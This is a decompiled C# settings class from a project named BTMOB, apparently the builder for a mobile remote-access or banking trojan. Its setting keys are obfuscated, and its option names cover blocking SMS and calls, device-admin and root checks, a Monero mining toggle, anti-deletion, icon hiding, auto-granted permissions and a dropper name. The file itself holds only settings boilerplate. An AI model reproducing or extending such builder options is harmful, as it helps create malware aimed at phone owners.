using System;
using System.CodeDom.Compiler;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB.My;

[CompilerGenerated]
[GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "17.6.0.0")]
[EditorBrowsable(EditorBrowsableState.Advanced)]
internal sealed class MySettings : ApplicationSettingsBase
{
	private static MySettings defaultInstance = (MySettings)SettingsBase.Synchronized(new MySettings());

	private static bool addedHandler;

	private static object addedHandlerLockObject = RuntimeHelpers.GetObjectValue(new object());

	public static MySettings Default
	{
		get
		{
			if (!addedHandler)
			{
				object obj = addedHandlerLockObject;
				ObjectFlowControl.CheckForSyncLockOnValueType(obj);
				bool lockTaken = false;
				try
				{
					Monitor.Enter(obj, ref lockTaken);
					if (!addedHandler)
					{
						MyProject.Application.Shutdown += AutoSaveSettings;
						addedHandler = true;
					}
				}
				finally
				{
					if (lockTaken)
					{
						Monitor.Exit(obj);
					}
				}
			}
			return defaultInstance;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool rememberme
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._66183738]);
		}
		set
		{
			this[EXGuarder._0C346D49] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string CLiname
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._0F20115E]);
		}
		set
		{
			this[EXGuarder._6D0A0754] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string appname
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._25586763]);
		}
		set
		{
			this[EXGuarder._45175418] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string applink
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._0F3D701C]);
		}
		set
		{
			this[EXGuarder._28563606] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string titletext
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._3F375F19]);
		}
		set
		{
			this[EXGuarder._34166050] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string msgtext
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._4B234750]);
		}
		set
		{
			this[EXGuarder._5441551E] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Acctitletext
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._57546664]);
		}
		set
		{
			this[EXGuarder._6A4E086A] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Accmsgtext
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._256E1F0D]);
		}
		set
		{
			this[EXGuarder._4B3A3715] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string Accbtntext
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._32101734]);
		}
		set
		{
			this[EXGuarder._5238136A] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string langtext
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._4259673B]);
		}
		set
		{
			this[EXGuarder._37543F61] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string SavedDGV
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._00222A41]);
		}
		set
		{
			this[EXGuarder._14532159] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string HiddenList
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._59142E77]);
		}
		set
		{
			this[EXGuarder._50406E0C] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("True")]
	public bool checkpump
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._3F287150]);
		}
		set
		{
			this[EXGuarder._3B280640] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("True")]
	public bool checkprotect
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._4D0B774C]);
		}
		set
		{
			this[EXGuarder._034C7369] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checknosleep
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._03444F69]);
		}
		set
		{
			this[EXGuarder._1D3A710E] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checknoemu
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._13487430]);
		}
		set
		{
			this[EXGuarder._62696038] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkantistop
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._023C4337]);
		}
		set
		{
			this[EXGuarder._503F5315] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkforceprims
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._3F750B3F]);
		}
		set
		{
			this[EXGuarder._6437325A] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool blocksms
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._0E2D3653]);
		}
		set
		{
			this[EXGuarder._66392C06] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool blockcalls
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._41533C5C]);
		}
		set
		{
			this[EXGuarder._54692C79] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool Devadmincheck
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._735D094D]);
		}
		set
		{
			this[EXGuarder._5479705E] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool rootcheck
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._411D2849]);
		}
		set
		{
			this[EXGuarder._66315713] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkxmr
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._721F724C]);
		}
		set
		{
			this[EXGuarder._64593024] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkffmpg
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._22285F26]);
		}
		set
		{
			this[EXGuarder._3B3A5A07] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("No Hide")]
	public string Hicocombo
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._500A4631]);
		}
		set
		{
			this[EXGuarder._1D141131] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkantidelete
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._3A314354]);
		}
		set
		{
			this[EXGuarder._2F484239] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkautoprims
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._62480C1F]);
		}
		set
		{
			this[EXGuarder._0B5E1E11] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkhidprim
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._21422C61]);
		}
		set
		{
			this[EXGuarder._341D080A] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkcaplock
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._49426E2D]);
		}
		set
		{
			this[EXGuarder._6A194166] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checkdisstore
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._471D0877]);
		}
		set
		{
			this[EXGuarder._645F6842] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string listhosts_data
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._1A622C68]);
		}
		set
		{
			this[EXGuarder._2C61051C] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string traklist_data
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._7614674E]);
		}
		set
		{
			this[EXGuarder._24721024] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("")]
	public string dropname
	{
		get
		{
			return Conversions.ToString(this[EXGuarder._0A1C5541]);
		}
		set
		{
			this[EXGuarder._6863750B] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	public StringCollection Steps
	{
		get
		{
			return (StringCollection)this[EXGuarder._50415843];
		}
		set
		{
			this[EXGuarder._620E4A2D] = value;
		}
	}

	[UserScopedSetting]
	[DebuggerNonUserCode]
	[DefaultSettingValue("False")]
	public bool checknotykill
	{
		get
		{
			return Conversions.ToBoolean(this[EXGuarder._0E3C5D5A]);
		}
		set
		{
			this[EXGuarder._52680602] = value;
		}
	}

	[DebuggerNonUserCode]
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	private static void AutoSaveSettings(object sender, EventArgs e)
	{
		if (MyProject.Application.SaveMySettingsOnExit)
		{
			MySettingsProperty.Settings.Save();
		}
	}
}
